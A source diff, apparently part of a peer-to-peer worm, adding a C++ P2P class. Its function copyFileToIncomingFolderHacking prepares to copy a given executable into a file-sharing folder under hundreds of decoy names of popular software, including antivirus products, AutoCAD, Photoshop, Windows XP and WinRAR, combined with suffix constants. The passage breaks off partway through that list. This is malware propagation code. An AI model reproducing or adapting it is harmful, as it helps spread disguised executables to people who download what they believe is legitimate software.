@@ -1,0 +1,408 @@
+#include "P2P.h"
+
+P2P::P2P(const char * rootFolderPath, const char * incomingFolderPath) {
+   rootFolderFullPath = new char[strlen(rootFolderPath) + 1];            
+   incomingFolderFullPath = new char[strlen(incomingFolderPath) + 1];
+   strcpy(rootFolderFullPath, rootFolderPath);
+   strcpy(incomingFolderFullPath, incomingFolderPath);
+   listeningPort = 0;
+}
+
+bool P2P::copyFileToIncomingFolder(const char * strFilename) {
+   return FunctionsFiles::copyFile(strFilename, incomingFolderFullPath);      
+}
+
+bool P2P::copyFileToIncomingFolderHacking(const char * strFilename) {
+    WINRegistry * WinReg = new WINRegistry();
+    list<string> lsoft;
+    char * sufix_filename, * sufix_filename2, * softVersion;
+    char ** plsoft;
+    char discardPattern[DISCARD_PATTERN_LEN];
+    
+    if (FunctionsFiles::fileExists(strFilename) && FunctionsFiles::fileExists(incomingFolderFullPath)) {
+       
+       /* PUSH CONSTANTS NAMES INTO FILENAME LIST */
+       if (FunctionsStrings::getExtension(strFilename) != NULL) {
+          if ((stricmp(FunctionsStrings::getExtension(strFilename), ".exe") == 0) || (stricmp(FunctionsStrings::getExtension(strFilename), ".com") == 0)) {
+             sufix_filename = (char *) malloc(strlen(SUFIX2) + 1);
+             strcpy(sufix_filename, SUFIX2); 
+             sufix_filename2 = (char *) malloc(strlen(SUFIX3) + 1);
+             strcpy(sufix_filename2, SUFIX3);
+             
+             lsoft.push_front(string("AVG Anti-Virus 9.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 8.0.229 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 8.0.176 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.503 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.484 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.430 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.1.43 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.1.36 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.0.519 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.0.50 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.0.47 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.302 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.211 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.1.392 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.1.375 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.1.362 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.1 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.0.323 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.0.280 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.0.245 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.0.240 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.0.209 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));                
+             lsoft.push_front(string("Ad-aware 2009 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 2008 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 2007 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 6.1 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 6.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 5.83 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 5.82 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 5.81 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 5.71 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 5.7 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2009 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2008 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2007  " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2006  " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2005  " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2004  " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2002  " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2000i  " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2000  " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autodesk 3ds Max 2009 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autodesk 3ds Max 2008 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autodesk 3ds Max 9 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autodesk 3ds Max 8 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Discreet 3ds Max 7 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Discreet 3ds Max 6 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Discreet 3ds Max 5 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Discreet 3ds Max 4 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("3D Studio Max R3 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("3D Studio Max R2 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Cyberlink PowerDVD 7.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Cyberlink PowerDVD 6.6 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Cyberlink PowerDVD 6.0.0.1424 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Cyberlink PowerDVD 6.0.0.1102 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Adobe Photoshop CS4 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Adobe Photoshop CS3 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Adobe Photoshop CS2 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 8.0.0.357 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 8.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 7.0.0.321 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 7.0.0.125 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 7.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 6.6.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 6.0.2.614 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 6.0.1.411 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 6.0.0.303 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 6.0.0.300 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 6.0.0.299 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Macromedia Flash 11 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Macromedia Flash 10 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Macromedia Flash 9 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Macromedia Flash 8 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Macromedia Flash 7 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Microsoft SQL Server 2008 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Microsoft SQL Server 2005 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Microsoft SQL Server 2000 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Microsoft SQL Server 7.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Microsoft SQL Server 6.5 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Microsoft SQL Server 6.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 9.2.6.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 9.0.9.4d " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 9.0.9.4b " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 8.3.13.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 8.3.6.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 8.3.2.1 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 8.2.8.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 8.1.1.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.11.10.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.10.1.1 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.8.5.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.7.5.1 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.5.7.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.5.1.1 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 7.0.1.2 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 6.6.1.15a " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 6.6.1.4 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 6.6.0.8 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 6.0.0.9 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 5.5.10.56 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 5.5.9.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 5.5.4.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 5.5 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 5.0.0.3 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Norton AntiVirus 2009 16.0.0.125 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Norton AntiVirus 2008 15.5.0.23 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Norton AntiVirus 2008 15.0.0.58 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Norton AntiVirus 2007 14.2.0.29 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Norton AntiVirus 2007 14.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Norton AntiVirus 2006 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nod32 Antivirus 3.0.684 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nod32 Antivirus 3.0.650 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nod32 Antivirus 3.0.414 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));                         
+             lsoft.push_front(string("Nod32 Antivirus 2.70.26 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Nod32 Antivirus 2.51.26 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Nod32 Antivirus 2.51.20 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Nod32 Antivirus 2.50.39 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Nod32 Antivirus 2.12.3 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Nod32 Antivirus 2.12.2 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Quake III Arena " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Windows XP SP3 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Windows XP SP2 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Windows XP SP1 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));                          
+             lsoft.push_front(string("WinRAR 3.80 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.71 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.62 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.61 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.60 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.50 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.42 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.41 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.40 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.30 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.20 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.11 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("WinRAR 3.0 " + string(sufix_filename) + string(FunctionsStrings::getExtension(strFilename))));
+
+             lsoft.push_front(string("AVG Anti-Virus 9.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 8.0.229 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 8.0.176 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.503 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.484 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.430 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.1.43 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.1.36 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.0.519 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.0.50 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5.0.47 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.5 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.302 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.211 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.1.392 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.1.375 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.1.362 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.1 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.0.323 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.0.280 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.0.245 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.0.240 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.0.209 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("AVG Anti-Virus 7.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));             
+             lsoft.push_front(string("Ad-aware 2009 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 2008 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 2007 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 6.1 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 6.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 5.83 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 5.82 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 5.81 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 5.71 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Ad-aware 5.7 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2009 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2008 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2007  " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2006  " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2005  " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2004  " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2002  " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2000i  " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autocad 2000  " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autodesk 3ds Max 2009 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autodesk 3ds Max 2008 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autodesk 3ds Max 9 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Autodesk 3ds Max 8 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Discreet 3ds Max 7 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Discreet 3ds Max 6 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Discreet 3ds Max 5 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Discreet 3ds Max 4 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("3D Studio Max R3 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("3D Studio Max R2 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Cyberlink PowerDVD 7.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Cyberlink PowerDVD 6.6 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Cyberlink PowerDVD 6.0.0.1424 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Cyberlink PowerDVD 6.0.0.1102 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Adobe Photoshop CS4 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Adobe Photoshop CS3 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Adobe Photoshop CS2 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 8.0.0.357 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 8.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 7.0.0.321 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 7.0.0.125 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 7.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 6.6.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 6.0.2.614 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 6.0.1.411 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 6.0.0.303 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 6.0.0.300 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Kaspersky Anti-Virus 6.0.0.299 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Macromedia Flash 11 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Macromedia Flash 10 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Macromedia Flash 9 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Macromedia Flash 8 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Macromedia Flash 7 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Microsoft SQL Server 2008 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Microsoft SQL Server 2005 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Microsoft SQL Server 2000 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Microsoft SQL Server 7.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Microsoft SQL Server 6.5 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Microsoft SQL Server 6.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 9.2.6.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 9.0.9.4d " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 9.0.9.4b " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 8.3.13.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
+             lsoft.push_front(string("Nero Burning ROM 8.3.6.0 " + string(sufix_filename2) + string(FunctionsStrings::getExtension(strFilename))));
